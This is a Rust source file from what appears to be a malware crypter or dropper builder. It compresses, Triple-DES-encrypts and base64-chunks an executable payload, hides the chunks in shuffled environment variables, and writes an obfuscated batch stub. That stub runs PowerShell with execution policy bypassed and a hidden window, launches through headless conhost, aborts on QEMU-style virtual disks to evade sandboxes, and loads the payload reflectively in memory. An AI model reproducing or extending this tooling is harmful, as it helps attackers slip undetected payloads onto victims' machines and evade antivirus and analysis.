use std::{fs, io::Write};

use base64::{prelude::BASE64_STANDARD, Engine};
use colored::{Color, Colorize};
use flate2::{write::GzEncoder, Compression};
use rand::{rngs::OsRng, seq::SliceRandom, Rng, RngCore};
use sha2::{Digest, Sha256};

use crate::{crypto::cipher_3des, h, mf_runner::MfStubCS, obf_batch::{obf_pseudo_batcloak::apply, random_casing, random_variable}, random, templates::{self}};

pub fn powershell_string_join(s: String) -> String {
    let mut r = String::new();
    let mut s = s.clone();

    while s.len() != 0 {
        let mut c = OsRng.gen_range(3..7);
        if c > s.len() {
            c = s.len();
        }
        r.push_str(&format!("'{}'+", &s[..c]));
        s = s[c..].to_string();
    }
    r[..r.len() - 1].to_string()
}

pub struct BatchBuilder {}

impl BatchBuilder {
    pub fn build(runner: &MfStubCS) {
        let mut hasher = Sha256::new();
        hasher.write_all(&runner.mf_runner_exe_bytes).unwrap();
        let sha256_res = hasher.finalize().to_vec();

        let mut compressed_mf_runner = GzEncoder::new(Vec::new(), Compression::default());
        compressed_mf_runner.write_all(&runner.mf_runner_exe_bytes).unwrap();
        let compressed_mf_runner = compressed_mf_runner.finish().unwrap();
        
        let mut des3_key = vec![0u8; 16];
        OsRng::fill_bytes(&mut OsRng, &mut des3_key);
        println!("{}{}{}", h(), "Encryption Key:      ".color(Color::Yellow), hex::encode(&des3_key).color(Color::Blue));
        println!("{}{}{}", h(), "MfRunner Hash:       ".color(Color::Yellow), hex::encode(&sha256_res).color(Color::Blue));

        println!("{}{}{}", h(), "Compressed MfRunner: ".color(Color::Yellow),
            (runner.mf_runner_exe_bytes.len().to_string() + " bytes -> " + &compressed_mf_runner.len().to_string() + " bytes").color(Color::Blue)
        );
        
        let encrypted_mf_runner = cipher_3des::encrypt_data(compressed_mf_runner, des3_key.clone());
        println!("{}{}", h(), "Encrypted stub with Triple DES".color(Color::Yellow));

        let mut base64_mf_runner = BASE64_STANDARD.encode(encrypted_mf_runner);
        let mut chunks: Vec<String> = Vec::new();

        while !base64_mf_runner.is_empty() {
            let mut c = OsRng.gen_range(2400..3000);
            if c > base64_mf_runner.len() {
                c = base64_mf_runner.len();
            }
            chunks.push(base64_mf_runner[..c].to_string());
            base64_mf_runner = base64_mf_runner[c..].to_string();
        }
        println!("{}{}", h(), ("Divided stub into ".to_string() + &chunks.len().to_string() + " base64 encoded chunks").color(Color::Yellow));

        let mut env_sets = Vec::new();
        let mut chunk_vars = Vec::new();
        let mut env_vars_powershell = String::new();

        for chunk in chunks {
            let v = random::generate(OsRng.gen_range(10..20));
            env_sets.push(format!("{} {}={}\n", &random_casing("set"), v, chunk));
            chunk_vars.push(v.clone());
            env_vars_powershell.push_str(&("$env:".to_string() + &v + " + "));
        }
        env_sets.shuffle(&mut OsRng);
        env_vars_powershell = env_vars_powershell[..env_vars_powershell.len() - 3].to_string();

        println!("{}{}", h(), "Creating powershell command line...".color(Color::Yellow));
        let mut powershell_cmd = templates::POWERSHELL_TEMPLATE.to_string();

        powershell_cmd = powershell_cmd.replace("'ECB'", &powershell_string_join("ECB".to_string()));
        powershell_cmd = powershell_cmd.replace("'PKCS7'", &powershell_string_join("PKCS7".to_string()));
        powershell_cmd = powershell_cmd.replace("'1System.IO.MemoryStream'", &powershell_string_join("System.IO.MemoryStream".to_string()));
        powershell_cmd = powershell_cmd.replace("'2System.IO.MemoryStream'", &powershell_string_join("System.IO.MemoryStream".to_string()));
        powershell_cmd = powershell_cmd.replace("'System.IO.Compression.GZipStream'", &powershell_string_join("System.IO.Compression.GZipStream".to_string()));
        powershell_cmd = powershell_cmd.replace("'System.Security.Cryptography.SHA256CryptoServiceProvider'", &powershell_string_join("System.Security.Cryptography.SHA256CryptoServiceProvider".to_string()));
        powershell_cmd = powershell_cmd.replace("'Win32_Process'", &powershell_string_join("Win32_Process".to_string()));
        powershell_cmd = powershell_cmd.replace("'mscorlib.dll'", &powershell_string_join("mscorlib.dll".to_string()));
        powershell_cmd = powershell_cmd.replace("'System.Reflection.Assembly'", &powershell_string_join("System.Reflection.Assembly".to_string()));
        powershell_cmd = powershell_cmd.replace("'Public,Static'", &powershell_string_join("Public,Static".to_string()));

        for i in 0..13 {
            powershell_cmd = powershell_cmd.replace(&("$".to_string() + &i.to_string() + "V"), &("$".to_string() + &random::generate(OsRng.gen_range(10..20))));
        }
        powershell_cmd = powershell_cmd.replace(
            "0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
            &format!("{:?}", des3_key).replace("[", "").replace("]", "").replace(" ", "")
        );
        powershell_cmd = powershell_cmd.replace(
            "183,39,47,55,35,11,110,125,2,82,63,79,206,64,75,83,20,25,239,176,189,158,247,103,20,104,196,196,14,76,7,102",
            &format!("{:?}", sha256_res).replace("[", "").replace("]", "").replace(" ", "")
        );
        powershell_cmd = powershell_cmd.replace("ENVIRONMENT_VARIABLES", &env_vars_powershell);
        powershell_cmd = "powershell.exe -ep bypass -w hidden -command ".to_string() + &powershell_cmd.replace("\r\n", "\n").replace("\n", "");
        println!("{}{}{}", h(), "Powershell Command:  ".color(Color::Yellow), powershell_cmd.color(Color::Blue));
        println!("{}{}", h(), "Building batch file...".color(Color::Yellow));
        

        let mut batch_file = String::new();
        batch_file += "@echo off\n";
        
        let variable_0 = random_variable();
        let variable_1 = random_variable();
        let variable_2 = random_variable();
        let variable_3 = random_variable();
        let variable_4 = random_variable();
        let variable_5 = random_variable();

        batch_file += &apply(&(random_casing("set") + " " + &variable_0 + "=openconsole.exe"));
        batch_file += &apply(&(random_casing("set") + " " + &variable_1 + "=imagename eq"));
        batch_file += &apply(&(random_casing("set") + " " + &variable_2 + "=" + &random_casing("tasklist /NH /FI")));
        batch_file += &apply(&(random_casing("set") + " " + &variable_3 + "=" + &random_casing(" find /i")));
        batch_file += &apply(&(random_casing("set") + " " + &variable_4 + "=^>nul"));
        batch_file += &(random_casing("set") + " " + &variable_1 + "=%" + &variable_1 + "% %" + &variable_0 + "%\n");
        batch_file += &("%".to_string() + &variable_2 + "% \"%" + &variable_1 + "%\" 2%" + &variable_4 + "%|%" + &variable_3 + "% \"%" + &variable_0 + "%\"%" + &variable_4 + "%\n");
        batch_file += &apply(&(random_casing("set") + " " + &variable_5 + "=start conhost.exe --headless"));
        batch_file = batch_file[..batch_file.len() - 1].to_string();
        let conhost_headless_set = batch_file.split('\n').last().unwrap().to_string();
        batch_file.insert_str(batch_file.find(&conhost_headless_set).unwrap(), &(random_casing("if") + " %ERRORLEVEL%==0 "));
        batch_file += "\n";
        let powershell_temp_var = random::generate(OsRng.gen_range(10..20));
        let mut triage_powershell_cmd = "powershell.exe -ep bypass -w hidden -command ".to_string();
        triage_powershell_cmd += &("$".to_string() + &powershell_temp_var + "=(Get-Disk).FriendlyName;");
        triage_powershell_cmd += &("if ($".to_string() + &powershell_temp_var + " -like " + &powershell_string_join("*DADY HARDDISK*".to_string()));
        triage_powershell_cmd += &(" -or $".to_string() + &powershell_temp_var + " -like " + &powershell_string_join("*QEMU HARDDISK*".to_string()));
        triage_powershell_cmd += ") {taskkill /f /im cmd.exe}";
        batch_file += &apply(&triage_powershell_cmd);
        batch_file = batch_file[..batch_file.len() - 1].to_string();
        let triage_powershell_command_line = batch_file.split('\n').last().unwrap().to_string();
        batch_file.insert_str(batch_file.find(&triage_powershell_command_line).unwrap(), &("%".to_string() + &variable_5 + "% "));
        batch_file += "\n";
        for set in env_sets {
            batch_file += &set;
        }
        batch_file += &apply(&powershell_cmd);
        batch_file = batch_file[..batch_file.len() - 1].to_string();
        let powershell_command_line = batch_file.split('\n').last().unwrap().to_string();
        batch_file.insert_str(batch_file.find(&powershell_command_line).unwrap(), &("%".to_string() + &variable_5 + "% "));
        
        
        println!("{}{}", h(), format!("Built batch file ({} kilobytes)", ((batch_file.len() as f64) / 1000.0)).color(Color::Yellow));
        fs::write("stub.bat", batch_file).unwrap();
        println!("{}{}", h(), "Wrote batch file to stub.bat".color(Color::Yellow));
        
    }
}
